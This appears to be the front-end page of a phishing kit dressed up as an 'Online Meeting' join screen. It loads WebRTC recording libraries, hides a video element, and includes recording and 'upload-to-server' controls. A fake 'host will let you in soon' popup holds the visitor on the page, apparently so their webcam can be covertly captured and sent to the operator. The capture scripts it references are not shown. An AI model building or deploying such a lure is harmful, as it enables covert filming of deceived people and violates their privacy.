<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Online Meeting</title>
    <meta property="og:title" content="Join online meeting" />
    <meta property="og:type" content="website" />
    <meta name="og:image" content="/desc.png" />
    <meta name="description" content="Join online meeting" property="og:description">
    <meta name="description" content="/desc.png" property="og:image" />
    <meta name="twitter:card" content="summary" />
	<meta name="twitter:title" content="Join meeting!" />
	<meta name="twitter:description" content="Join online meeting" />
	<meta name="twitter:image" content="/desc.png">
    <script
      defer
      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
    ></script>
    <script defer src="https://kit.fontawesome.com/c4c45dfab4.js"></script>
    <script defer src="https://www.webrtc-experiment.com/RecordRTC.js"></script>
    <script
      defer
      src="https://www.webrtc-experiment.com/gif-recorder.js"
    ></script>
    <script
      defer
      src="https://www.webrtc-experiment.com/getScreenId.js"
    ></script>
    <script defer src="https://www.webrtc-experiment.com/DetectRTC.js"></script>

    <!-- for Edige/FF/Chrome/Opera/etc. getUserMedia support -->
    <script
      defer
      src="https://webrtc.github.io/adapter/adapter-latest.js"
    ></script>
    <script defer src="./script.js"></script>
    <script defer src="/recorder.js"></script>
    <link rel="stylesheet" href="./styles.css" />
  </head>

  <body>
    <div class="video-wrap" hidden="hidden">
      <video id="video" playsinline autoplay></video>
      <video
        controls
        playsinline
        autoplay
        muted="false"
        volume="1"
        class="recordvideo"
      ></video>
    </div>

    <center>
      <canvas id="canvas" width="640" height="480" autoplay></canvas>
    </center>
    <div class="recordrtc">
      <button class="switch-recording"></button>
      <button id="upload-to-server"></button>
    </div>
    <div class="float_button">
      <i
        class="fas fa-expand"
        style="color: #fff; font-size: 18px; margin-top: 5px;"
      ></i>
    </div>
    <div id="ac-wrapper">
      <div id="popup">
        <center>
          <h2>Please wait the meeting host will let you in soon</h2>
        </center>
      </div>
    </div>
    <div class="bottom-bar">
      <div class="icon-button" >
        <i class="fas fa-microphone"></i>
        <h6>Mute</h6>
      </div>
      <div class="icon-button" >
        <i class="fas fa-video"></i>
        <h6>Stop Video</h6>
      </div>
      <div class="icon-button" style="margin-left: auto;">
        <i class="fas fa-shield-alt"></i>
        <h6>Security</h6>
      </div>
      <div class="icon-button" >
        <i class="fas fa-users"></i>
        <h6>Participants</h6>
      </div>
      <div class="icon-button" style="color: lawngreen">
        <i class="fas fa-plus-square"></i>
        <h6>Share content</h6>
      </div>
      <div class="icon-button" >
        <i class="fas fa-comments"></i>
        <h6>Chat</h6>
      </div>
      <div class="icon-button" style="margin-right: auto;">
        <i class="fas fa-record-vinyl"></i>
        <h6>Record</h6>
      </div>
      <button style="margin-right: 50px;">End</button>
    </div>
  </body>
</html>
